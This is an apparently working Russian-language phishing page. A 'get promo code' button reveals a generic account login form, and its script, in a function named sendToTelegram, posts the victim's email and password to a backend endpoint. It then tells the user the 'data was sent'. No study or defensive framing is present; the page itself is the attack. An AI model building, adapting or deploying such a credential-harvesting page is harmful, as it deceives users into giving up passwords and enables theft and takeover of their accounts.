<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Специальный вход</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000000;
            font-family: 'Arial', sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            overflow: hidden;
        }

        .main-btn {
            background: linear-gradient(145deg, #ffffff, #cccccc);
            border: none;
            padding: 20px 40px;
            font-size: 24px;
            font-weight: bold;
            color: #000;
            cursor: pointer;
            border-radius: 12px;
            box-shadow: 5px 5px 10px rgba(255, 255, 255, 0.1), 
                        -5px -5px 10px rgba(0, 0, 0, 0.2);
            transition: 0.3s;
            text-transform: uppercase;
            animation: pulse 2s infinite;
        }

        .main-btn:active {
            transform: scale(0.95);
        }

        .login-box {
            display: none;
            flex-direction: column;
            align-items: center;
            width: 300px;
            text-align: center;
            animation: fadeIn 0.5s ease;
        }

        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: #222;
            border: 1px solid #444;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border-color: #fff;
        }

        .submit-btn {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
        }

        .submit-btn:hover {
            background-color: #0056b3;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .loader {
            display: none;
            margin-top: 10px;
            font-size: 14px;
            color: #aaa;
        }
    </style>
</head>
<body>

    <button class="main-btn" onclick="showForm()">ПОЛУЧИТЬ ПРОМОКОД</button>

    <div class="login-box" id="loginForm">
        <h2 style="margin-bottom: 20px;">Вход в аккаунт</h2>
        
        <input type="text" id="email" placeholder="Ваш Email" required>
        <input type="password" id="password" placeholder="Пароль" required>
        
        <button class="submit-btn" onclick="sendToTelegram()">Подтвердить</button>
        
        <div class="loader" id="loader">Отправка...</div>
    </div>

    <script>
        function showForm() {
            document.querySelector('.main-btn').style.display = 'none';
            document.getElementById('loginForm').style.display = 'flex';
        }

        function sendToTelegram() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if(email && password) {
                document.getElementById('loader').style.display = 'block';

                fetch('/functions/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password
                    })
                })
                .then(response => response.json())
                .then(data => {
                    document.getElementById('loader').style.display = 'none';
                    if(data.success) {
                        alert('Данные отправлены!');
                        document.getElementById('email').value = '';
                        document.getElementById('password').value = '';
                    } else {
                        alert('Ошибка: ' + (data.error || 'неизвестная'));
                    }
                })
                .catch(error => {
                    console.log("Error sending data:", error);
                    document.getElementById('loader').style.display = 'none';
                    alert('Ошибка отправки данных');
                });
            } else {
                alert('Введите всё правильно!');
            }
        }
    </script>

</body>
</html>
